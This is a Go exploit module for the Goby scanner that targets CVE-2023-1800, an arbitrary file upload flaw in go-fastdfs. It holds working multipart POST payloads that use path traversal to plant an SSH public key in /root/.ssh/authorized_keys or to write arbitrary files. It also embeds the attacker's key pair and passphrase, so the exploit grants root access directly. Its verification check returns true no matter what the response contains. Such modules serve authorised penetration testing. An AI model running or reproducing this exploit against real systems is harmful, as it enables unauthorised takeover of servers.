package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Go fastdfs /group1/upload api file upload vulnerability (CVE-2023-1800)",
    "Description": "<p>Go fast dfs is a simple distributed file system (private cloud storage), which has the advantages of no center, high performance, high reliability, maintenance free, etc. It supports breakpoint resume, block upload, small file merge, automatic synchronization, and automatic repair.</p><p>There is an arbitrary file upload vulnerability in the Go fastdfs upload interface, which allows attackers to upload arbitrary files to the server and attack the server.</p>",
    "Product": "go-fastdfs",
    "Homepage": "https://github.com/sjqzhang/go-fastdfs",
    "DisclosureDate": "2023-05-11",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"go-fastdfs\"",
    "GobyQuery": "title=\"go-fastdfs\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file upload vulnerability in the Go fastdfs upload interface, which allows attackers to upload arbitrary files to the server and attack the server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/sjqzhang/go-fastdfs\">https://github.com/sjqzhang/go-fastdfs</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom,uploadSSHKey",
            "show": ""
        },
        {
            "name": "uploadIds",
            "type": "input",
            "value": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/hhN3QUvQE5kr9++kgNYNbEu6+PTNZADw3Zg69aX03jMVLw22e8oiaxAjd3EmGfnbLOk0eqjRTLhhTs0fh0/6E4MEkYclk9OjDpsLGRc2IaS9xJHQyG4q1MrH6X3sydMAuW59VLlQet46OBp+pH+6cZ7mHTH2nGjaZfUaHMIo6L2h1cza33aPV3hGKjYQN5W0jWd0m/uDHpsnSkUqO7NiEhrOBO+vhVk+mz796TdHs7DJoEzxYNK+FXtNmHFowJs5IpIeYbWVagI8uDccK/f/nA7f+oUzX6IW07mGp8EsOJGmFngKpPQ0wbVy7RdYIY/NCZgMFveXhW/dKq0A2jw/ root@testgo",
            "show": "attackType=uploadSSHKey"
        },
        {
            "name": "dir",
            "type": "input",
            "value": "../../../../../tmp",
            "show": "attackType=custom"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "testName",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "text",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "2H1W"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-1800"
    ],
    "CNNVD": [
        "CNNVD-202304-027"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "go-fastdfs /group1/upload 接口文件上传漏洞（CVE-2023-1800）",
            "Product": "go-fastdfs",
            "Description": "<p>go-fastdfs 是一个简单的分布式文件系统(私有云存储)，具有无中心、高性能，高可靠，免维护等优点，支持断点续传，分块上传，小文件合并，自动同步，自动修复。</p><p>Go-fastdfs upload 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，攻击服务器。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://github.com/sjqzhang/go-fastdfs\" target=\"_blank\">https://github.com/sjqzhang/go-fastdfs</a><br></p>",
            "Impact": "<p>攻击者可使用文件上传上传公钥到ssh目录获取服务器权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Go fastdfs /group1/upload api file upload vulnerability (CVE-2023-1800)",
            "Product": "go-fastdfs",
            "Description": "<p>Go fast dfs is a simple distributed file system (private cloud storage), which has the advantages of no center, high performance, high reliability, maintenance free, etc. It supports breakpoint resume, block upload, small file merge, automatic synchronization, and automatic repair.</p><p>There is an arbitrary file upload vulnerability in the Go fastdfs upload interface, which allows attackers to upload arbitrary files to the server and attack the server.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://github.com/sjqzhang/go-fastdfs\" target=\"_blank\">https://github.com/sjqzhang/go-fastdfs</a></p>",
            "Impact": "<p>There is an arbitrary file upload vulnerability in the Go fastdfs upload interface, which allows attackers to upload arbitrary files to the server and attack the server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			//ids := "testids ssh key "
			postDate := "------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"file\"; filename=\"id\"\nContent-Type: application/octet-stream\n\ntest\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"scene\"\n\ndefault\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"filename\"\n\nid_rsa\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"output\"\n\njson2\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"path\"\n\n../../../../../root/.ssh\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"code\"\n\n\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"auth_token\"\n\n\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"submit\"\n\nupload\n------WebKitFormBoundaryigj9M9EJykZc9u53--"
			cfg := httpclient.NewPostRequestConfig("/group1/upload")
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryigj9M9EJykZc9u53")
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf(postDate)
			resp, err := httpclient.DoHttpRequest(hostinfo, cfg)
			if err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "status\": \"ok") && strings.Contains(resp.Utf8Html, "message\":") && strings.Contains(resp.Utf8Html, "data\":") {
					return true
				}
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uploadIds := ss.Params["uploadIds"].(string)
			Content := ss.Params["content"].(string)
			dir := ss.Params["dir"].(string)
			Filename := ss.Params["filename"].(string)
			postsshDate := "------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"file\"; filename=\"id\"\nContent-Type: application/octet-stream\n\n" + uploadIds + "\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"scene\"\n\ndefault\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"filename\"\n\nauthorized_keys\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"output\"\n\njson2\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"path\"\n\n../../../../../root/.ssh\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"code\"\n\n\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"auth_token\"\n\n\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"submit\"\n\nupload\n------WebKitFormBoundaryigj9M9EJykZc9u53--"
			postDate := "------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"file\"; filename=\"id\"\nContent-Type: application/octet-stream\n\n" + Content + "\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"scene\"\n\ndefault\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"filename\"\n\n" + Filename + "\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"output\"\n\njson2\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"path\"\n\n" + dir + "\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"code\"\n\n\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"auth_token\"\n\n\n------WebKitFormBoundaryigj9M9EJykZc9u53\nContent-Disposition: form-data; name=\"submit\"\n\nupload\n------WebKitFormBoundaryigj9M9EJykZc9u53--"
			cfg := httpclient.NewPostRequestConfig("/group1/upload")
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryigj9M9EJykZc9u53")
			cfg.VerifyTls = false
			if ss.Params["attackType"].(string) == "uploadSSHKey" {
				cfg.Data = fmt.Sprintf(postsshDate)
				if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					expResult.Success = true
					expResult.Output = "上传公钥成功，请尝试使用进行连接私钥pass为:testgo  私钥如下\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,38533DF462BD2A579003D53C7E6B6FB5\n\nk0LWkimMnoHcjK37y8+NCwuAE8sA7h5geuW3X1LdmjLt45Cr16BcXMgaZEL7BFPZ\nMpPLcXXO4NCQo7uDeMbQWbRI9H7/V+75lX+H4E1gBhY+1THlYp+5pC+vfyEk9tsz\nGNuv/mLQuw3PxwmtqKJM9flwyDBLB325gdbOT7i+c4lTg9yqXi+NRPI2wy6IeIzu\nOz2BAEqv7811fPnXquNy1SbUakD+hsrTEPmHU5j4UvqDVDxk6cOP+QOUuN7jlliX\nuO8qsE9Yar93kHrg7fYgX0jHuSgsavOp3R611FW9dWybSbkSBFThJGfTtyEdfvI1\nBy3/qyWarBohK96NdNqsjV4ynKQCXz8t0hdtFLm44AhLL2fUxt+YSsYzyC5F6vFr\nily/ulEklfOKC1RJcY8+/5JShLxv3+UAALUEIiu3gS1lLQVpqdld4PNgqJcXwVq3\nKWvVc/UFPtbFDdMk1/iR3UWSvUv1i5sSlF2M1LbCPqN6qi5jtIP1i7zDBCjmb/xS\nIH8GnQYNTc1kCCyf4GRov+wwS2Vr0J4hFtpi6RXVDcebyxBR7tb2uuIL66yfewUG\nPFb6tmFqnUMYndQt2L2lqxWQXvWNtXh6wkZNe5XeTdwVl6unkQSjAfUSc7ndeAyp\ncXpuvuqfbkIAkWAwz23f4K1zlbEieYnYWOTreacVdak5vqeSWUlhBmnhEc2iBVHB\nag9OGMdwNumMSQefTCmCDd56WuLT7HoAdYKMRk9d/cOUWq3G/uHl0mRckm+eEwYH\n+ddq40DRRlOR+/OJBjYVjjtxL40ebOZOrgeI7RcfOKmkCi7I4CW49UZqv1w8WYC5\nyIuaUyCzsA+LeO8BtKAw4zZgKAiPZLoNlTNcU7rt+KOd2JdPO5ZQA6m5su2VVBR7\nTEEFykcOOwRHmX98di+6KnfwqqHo+SRtA5fP3AJGNaqVhME/3KCbWl0N3URrx88z\nMCBisaLFfIp2F4yYJhOTEgeS2E3otfagafPdTgY1n/8n++hb8IePw9eI0X2RuQrh\nKjm2BqWoGGZzIgj6bH71PPVuFXkHEzX4lk7YT6am+rs1oikMS/es2Bw5e/2UkL98\n+4JlVWIR3OSN+l0cGc9meEeBJO29q70E9IKBkDze8OzFufRXxquDiSSzjpZ/XfTF\nj9K4E6lT4Elh4wh25TJZ+AWQT528WoJoM+cuzG1dNaBCzG4hRIPrjJhMSBiEMpE4\nVrFO1tcvB8NwNZS4V+mnT/A2pDArfUBUBr1bBDIx73khT68/bmV3BTY3z4yZwIgC\nSwY3/i8yKWm7F0Okrsl6srn9DD5LA/Tf6d43xIjG38QffURiGQDGSbxzRWohe8ES\nUyYrOJbjZkZZGzhBcKIm0a5clqgmhv3j5VHjsg34PnC/FXg+pAPG79GM8Bl+jnMg\nUgFi6CCN4/CYM8DjmB7gws2H1SNF3ER+n4vCxT4/MlXA+1d8RuJlUOvkOQ2Na7M5\nTrQj6EHEN7e3Q5D1RyyQFZsG0TXadC6t/hP7qSUAL5AezPo60nrFo10TJxhxY2sx\nFkiqFvVbM26WbSXuM6tgtnNZXit5xJfdlFz7eE9mVIxCT1ZSDZUvjra2bW/qbVfp\n-----END RSA PRIVATE KEY-----\n\n"

				}
				return expResult
			}
			cfg1 := httpclient.NewPostRequestConfig("/group1/upload")
			cfg1.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryigj9M9EJykZc9u53")
			cfg.VerifyTls = false

			cfg1.Data = fmt.Sprintf(postDate)
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {

				expResult.Success = true
				expResult.Output = resp1.RawBody

			}
			return expResult

		},
	))
}
